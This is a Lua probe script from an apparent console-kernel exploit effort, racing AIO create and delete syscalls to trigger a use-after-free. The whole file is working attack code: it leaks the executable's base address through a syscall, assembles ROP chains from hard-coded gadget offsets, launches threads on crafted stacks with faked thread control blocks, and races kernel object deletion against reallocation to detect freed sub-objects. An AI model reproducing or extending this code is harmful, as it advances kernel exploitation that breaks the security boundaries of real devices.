-- CRASH_CLASS: HIGH
-- PROBE 525a: parent creates while two children delete the same ids
--
-- Context: 524b showed the two-zero delete race is benign - the free of C and
-- S happens under a re-lock and is guarded by null checks on [W+0x18]/[W+0x20]
-- (13.60 file offsets 0x3afe63 lock, 0x3afe9f item re-read, 0x3afec8 null
-- check, 0x3afed1 release, 0x3afee8 free C, 0x3afef5 clear, 0x3aff09 S).
--
-- The 14.20 note describes a different target: the delete re-acquires the AIO
-- object after dropping the lock, so a slot freed and re-allocated inside that
-- window leaves the deleting caller freeing sub-objects of the new object at
-- the old index. A child cannot call 669 (needs rcx/r8, no gadgets for them),
-- so the parent does the allocating while the children delete.
--
-- Each parent create during the race may take a slot a child just freed; if a
-- child's second lookup then lands after that create, it frees the new
-- object's C and S. The new object's own poll and delete are the detector:
-- they would see a nulled S and return something outside the normal set.

print("=== PROBE 525a: DELETE-CREATE SWAP RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function hex(v) return string.format("%08X", (v or 0) % 4294967296) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("[A] eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_thr_new = mk(455)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local one_cell = memory.alloc(16)
local st_poll = memory.alloc(16)
local st_del = memory.alloc(16)

local function parent_cycle()
    for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok or N(rv) ~= 0 then return "create", (rv and N(rv)) or -999, nil, nil end
    local id = rd(N(out_id))
    if id == nil then return "noid", 0, nil, nil end
    wd(N(one_cell), id)
    wd(N(st_poll), 0xCCCCCCCC)
    local pok = pcall(function() sc_poll(uint64(N(one_cell)), uint64(1), uint64(N(st_poll))) end)
    local ps = rd(N(st_poll))
    if not pok then return "pollcall", 0, id, ps end
    wd(N(st_del), 0xCCCCCCCC)
    local dok = pcall(function() sc_delete(uint64(N(one_cell)), uint64(1), uint64(N(st_del))) end)
    local ds = rd(N(st_del))
    if not dok then return "delcall", 0, id, ps end
    return "ok", id, ps, ds
end

-- [B] shared ids for the children
local IDS = 100
local ids_buf = memory.alloc(IDS * 4 + 64)
for i = 1, IDS do
    for j = 0, 0xFC, 4 do wd(N(data) + j, 0) end
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok or N(rv) ~= 0 then print("    create failed at " .. i); break end
    local sid = rd(N(out_id))
    wd(N(ids_buf) + (i - 1) * 4, sid)
    -- poll so the object reaches state 3 and the delete can reach its second lookup
    wd(N(one_cell), sid)
    wd(N(st_poll), 0xCCCCCCCC)
    pcall(function() sc_poll(uint64(N(one_cell)), uint64(1), uint64(N(st_poll))) end)
end
print(string.format("[B] shared ids created=%d", IDS))
if not alive() then return end

-- [C] two delete-only children
local function build_child(count, status)
    for i = 0, count * 4 - 4, 4 do wd(status + i, 0xCCCCCCCC) end
    local CHAIN_MAX = 0x10000
    local stk = memory.alloc(0x8000 + CHAIN_MAX)
    local sb = N(stk)
    local ss = 0x8000
    local rsp = sb + ss - 8
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fs_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    for i = 0, count - 1 do
        emit(g_pop_rdi); emit(uint64(N(ids_buf) + i * 4))
        emit(g_pop_rsi); emit(uint64(1))
        emit(g_pop_rdx); emit(uint64(status + i * 4))
        emit(g_pop_rax); emit(uint64(662))
        emit(stub)
    end
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)
    return par, off
end

local sa = memory.alloc(IDS * 4 + 64)
local sb2 = memory.alloc(IDS * 4 + 64)
local p1, len1 = build_child(IDS, N(sa))
local p2, len2 = build_child(IDS, N(sb2))
print(string.format("[C] chains %d / %d bytes", len1, len2))
for _, p in ipairs({p1, p2}) do
    local ok, rv = pcall(function() return sc_thr_new(p, uint64(0x38)) end)
    print(string.format("    launch ok=%s rv=%s alive=%s", tostring(ok), tostring(N(rv)), tostring(alive())))
end

-- [D] drive creates while the children run
print("[D] parent cycles during the race")
local cycles, createFail, pollOdd, delOdd = 0, 0, 0, 0
local odd = {}
local t0 = os.clock()
while (os.clock() - t0) < 1.2 and cycles < 4000 do
    local kind, id, ps, ds = parent_cycle()
    cycles = cycles + 1
    if kind ~= "ok" then
        createFail = createFail + 1
        if #odd < 8 then odd[#odd + 1] = string.format("%s ret=%s", kind, hex(id)) end
    else
        if ps ~= 0x3 and ps ~= 0x10003 then
            pollOdd = pollOdd + 1
            if #odd < 8 then odd[#odd + 1] = string.format("id=%s poll=%s", hex(id), hex(ps)) end
        end
        if ds ~= 0 then
            delOdd = delOdd + 1
            if #odd < 8 then odd[#odd + 1] = string.format("id=%s del=%s", hex(id), hex(ds)) end
        end
    end
    if not alive() then break end
end
print(string.format("[D] cycles=%d createFail=%d pollOdd=%d delOdd=%d alive=%s",
    cycles, createFail, pollOdd, delOdd, tostring(alive())))
for _, line in ipairs(odd) do print("    " .. line) end
if not alive() then return end

-- [E] child statuses
local spins = 0
while spins < 300000 do
    if rd(N(sa) + (IDS - 1) * 4) ~= -858993460 and rd(N(sb2) + (IDS - 1) * 4) ~= -858993460 then break end
    spins = spins + 1
end
local one, two, other = 0, 0, 0
for i = 0, IDS - 1 do
    local a = rd(N(sa) + i * 4)
    local b = rd(N(sb2) + i * 4)
    local z = 0
    if a == 0 then z = z + 1 end
    if b == 0 then z = z + 1 end
    if z == 1 then one = one + 1 elseif z == 2 then two = two + 1 end
    if (a ~= 0 and a ~= 0x80020003 and a ~= 0x80020010) or (b ~= 0 and b ~= 0x80020003 and b ~= 0x80020010) then other = other + 1 end
end
print(string.format("[E] children: one-zero=%d two-zero=%d other=%d alive=%s", one, two, other, tostring(alive())))
print(string.format("    sample: c1 %s %s %s  c2 %s %s %s",
    hex(rd(N(sa))), hex(rd(N(sa)+4)), hex(rd(N(sa)+8)),
    hex(rd(N(sb2))), hex(rd(N(sb2)+4)), hex(rd(N(sb2)+8))))

-- [F] health
local okc, clean = 0, 0
for i = 1, 4 do
    local kind, id, ps, ds = parent_cycle()
    if kind == "ok" then
        okc = okc + 1
        if ds == 0 then clean = clean + 1 end
    end
end
print(string.format("[F] health created=%d clean=%d alive=%s", okc, clean, tostring(alive())))
print("=== PROBE 525a COMPLETE ===")
